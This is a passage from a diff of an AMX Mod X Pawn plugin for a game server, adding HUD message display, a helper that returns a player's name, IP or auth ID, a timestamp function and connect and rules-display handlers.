+			set_hudmessage(  255,  0,  0,  0.10, 0.25,  0,  0.0 , 0.2,  0.0,  0.1,  1  );
+			ShowSyncHudMsg(  iPlayer,  SyncHudMessage,  "%s",  szHostName  );
+		}
+		case 2:
+		{
+			set_hudmessage(  235,  255,  45,  -1.0, -1.0,  0,  0.0 , 0.2,  0.0,  0.1,  2  );
+			ShowSyncHudMsg(  iPlayer,  SyncHudMessage2,  "%s",  szHostName  );
+		}
+		case 3:
+		{
+			set_hudmessage(  0,  0,  255,  0.75, 0.75,  0,  0.0 , 0.2,  0.0,  0.1,  3  );
+			ShowSyncHudMsg(  iPlayer,  SyncHudMessage3,  "%s",  szHostName  );
+		}
+	}
+	
+}
+
+
+
+
+stock GetInfo( id, const iInfo )
+{
+	
+	new szInfoToReturn[  64  ];
+	
+	switch(  iInfo  )
+	{
+		case INFO_NAME:
+		{
+			new szName[ 32 ];
+			get_user_name(  id,  szName,  sizeof ( szName ) -1  );
+			
+			copy(  szInfoToReturn,  sizeof ( szInfoToReturn ) -1,  szName  );
+		}
+		case INFO_IP:
+		{
+			new szIp[ 32 ];
+			get_user_ip(  id,  szIp,  sizeof ( szIp ) -1,  1  );
+			
+			copy(  szInfoToReturn,  sizeof ( szInfoToReturn ) -1,  szIp  );
+		}
+		case INFO_AUTHID:
+		{
+			new szAuthId[ 35 ];
+			get_user_authid(  id,  szAuthId,  sizeof ( szAuthId ) -1  );
+			
+			copy(  szInfoToReturn,  sizeof ( szInfoToReturn ) -1,  szAuthId  );
+		}
+	}
+
+	return szInfoToReturn;
+}
+
+stock _get_time( )
+{
+	new logtime[ 32 ];
+	get_time("%d.%m.%Y - %H:%M:%S", logtime ,sizeof ( logtime ) -1 );
+	
+	return logtime;
+}
+public RandomHudWithRandomColors()
+{
+	set_hudmessage( random_num( 0, 255 ), random_num( 0, 255 ), random_num( 0, 255 ), -1.0, 0.0, random_num( 0, 2 ), 6.0, 8.0 );
+	show_hudmessage( 0, "%s", hud_messages[ random_num( 0, charsmax( hud_messages ) ) ] );
+}
+
+public client_connect(id) type_spec[id] = false
+public Rule(id) set_task(20.0, "PrintRule", id)
+/* AMXX-Studio Notes - DO NOT MODIFY BELOW HERE
+*{\\ rtf1\\ ansi\\ deff0{\\ fonttbl{\\ f0\\ fnil Tahoma;}}\n\\ viewkind4\\ uc1\\ pard\\ lang1033\\ f0\\ fs16 \n\\ par }
+*/
+t
